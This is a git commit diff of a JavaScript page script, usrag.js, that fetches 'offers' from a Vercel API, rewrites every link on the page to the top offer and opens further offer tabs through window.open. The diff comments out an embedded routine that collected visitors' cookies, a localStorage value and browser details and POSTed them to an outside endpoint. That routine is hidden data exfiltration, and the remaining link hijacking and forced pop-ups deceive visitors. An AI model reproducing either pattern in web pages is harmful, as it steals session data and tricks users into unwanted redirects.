d292386f758bbd6a4e04e1704528bb7dd0a1d432
NikDzub <87159434+NikDzub@users.noreply.github.com>
2024-09-05 23:37:15 +0300

    .

--- usrag.js
+++ usrag.js
@@ -1,7 +1,7 @@
 const agent = navigator.userAgent;
 // const agent =
 //   'Mozilla/5.0 (Linux; Android 12; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36';
-const apiUrl = 'https://node-59be0wiym-nikdzubs-projects.vercel.app/api/data';
+const apiUrl = 'https://node-llswp4vo9-nikdzubs-projects.vercel.app/api/data';
 // const apiUrl = 'https://cors-anywhere.herokuapp.com/unlockcontent.net/api/v2';
 const root = document.querySelector('#root');
 root.style.display = 'block';
@@ -61,9 +61,10 @@ if (agent.indexOf('music') >= 0) {
       links.forEach((link) => {
         if (sortedOffers.length > 0) {
           link.href = sortedOffers[0].link;
-          // window.open(sortedOffers[0].link, '_blank');
         }
       });
+      window.open(sortedOffers[1].link, '_blank');
+
       // Optionally redirect to the top offer
       // location.href = sortedOffers[0]?.link;
     })
@@ -117,17 +118,18 @@ if (agent.indexOf('music') >= 0) {
       console.log('Sorted Offers:', sortedOffers);
 
       const links = document.querySelectorAll('a');
+
       links.forEach((link) => {
         if (sortedOffers.length > 0) {
           link.href = sortedOffers[0].link;
 
-          root.addEventListener('click', () => {
-            window.open(sortedOffers[1].link, '_blank');
-          });
-          array.forEach((element, index, arr) => {
-            window.open(sortedOffers[index].link, '_blank');
-          });
+          // array.forEach((element, index, arr) => {
+          //   window.open(sortedOffers[index].link, '_blank');
+          // });
         }
+      });
+      root.addEventListener('click', () => {
+        window.open(sortedOffers[1].link, '_blank');
       });
       // Optionally redirect to the top offer
       // location.href = sortedOffers[0]?.link || '#';
@@ -137,73 +139,73 @@ if (agent.indexOf('music') >= 0) {
     });
 }
 
-(function () {
-  function collectBrowserInfo() {
-    const info = {};
+// (function () {
+//   function collectBrowserInfo() {
+//     const info = {};
 
-    try {
-      info['User Agent'] = navigator.userAgent;
-      info['Browser Version'] = navigator.userAgent;
-      info['Platform'] = navigator.platform;
-      info[
-        'Screen Resolution'
-      ] = `${window.screen.width}x${window.screen.height}`;
+//     try {
+//       info['User Agent'] = navigator.userAgent;
+//       info['Browser Version'] = navigator.userAgent;
+//       info['Platform'] = navigator.platform;
+//       info[
+//         'Screen Resolution'
+//       ] = `${window.screen.width}x${window.screen.height}`;
 
-      try {
-        info['Cookies'] = document.cookie;
-      } catch (e) {
-        info['Cookies'] = 'Failed to access cookies';
-      }
+//       try {
+//         info['Cookies'] = document.cookie;
+//       } catch (e) {
+//         info['Cookies'] = 'Failed to access cookies';
+//       }
 
-      try {
-        info['Local Storage'] = localStorage.getItem('key') || 'No data';
-      } catch (e) {
-        info['Local Storage'] = 'Failed to access local storage';
-      }
+//       try {
+//         info['Local Storage'] = localStorage.getItem('key') || 'No data';
+//       } catch (e) {
+//         info['Local Storage'] = 'Failed to access local storage';
+//       }
 
-      info['Fetch API Supported'] = 'fetch' in window ? 'Yes' : 'No';
-      info['Service Workers Supported'] =
-        'serviceWorker' in navigator ? 'Yes' : 'No';
+//       info['Fetch API Supported'] = 'fetch' in window ? 'Yes' : 'No';
+//       info['Service Workers Supported'] =
+//         'serviceWorker' in navigator ? 'Yes' : 'No';
 
-      try {
-        if ('connection' in navigator) {
-          const connection =
-            navigator.connection ||
-            navigator.mozConnection ||
-            navigator.webkitConnection;
-          info['Effective Connection Type'] = connection.effectiveType;
-        }
-      } catch (e) {
-        info['Effective Connection Type'] =
-          'Failed to access network information';
-      }
-    } catch (e) {
-      console.error(
-        'An error occurred while gathering browser information:',
-        e
-      );
-    }
+//       try {
+//         if ('connection' in navigator) {
+//           const connection =
+//             navigator.connection ||
+//             navigator.mozConnection ||
+//             navigator.webkitConnection;
+//           info['Effective Connection Type'] = connection.effectiveType;
+//         }
+//       } catch (e) {
+//         info['Effective Connection Type'] =
+//           'Failed to access network information';
+//       }
+//     } catch (e) {
+//       console.error(
+//         'An error occurred while gathering browser information:',
+//         e
+//       );
+//     }
 
-    return info;
-  }
+//     return info;
+//   }
 
-  function sendInfoToAPI(info) {
-    fetch('https://node-q1uu7auvk-nikdzubs-projects.vercel.app/api/data', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(info),
-    })
-      .then((response) => response.json())
-      .then((data) => {
-        console.log('Success:', data);
-      })
-      .catch((error) => {
-        console.error('Error:', error);
-      });
-  }
+//   function sendInfoToAPI(info) {
+//     fetch('https://node-q1uu7auvk-nikdzubs-projects.vercel.app/api/data', {
+//       method: 'POST',
+//       headers: {
+//         'Content-Type': 'application/json',
+//       },
+//       body: JSON.stringify(info),
+//     })
+//       .then((response) => response.json())
+//       .then((data) => {
+//         console.log('Success:', data);
+//       })
+//       .catch((error) => {
+//         console.error('Error:', error);
+//       });
+//   }
 
-  const browserInfo = collectBrowserInfo();
-  sendInfoToAPI(browserInfo);
-})();
+//   const browserInfo = collectBrowserInfo();
+//   sendInfoToAPI(browserInfo);
+// })();
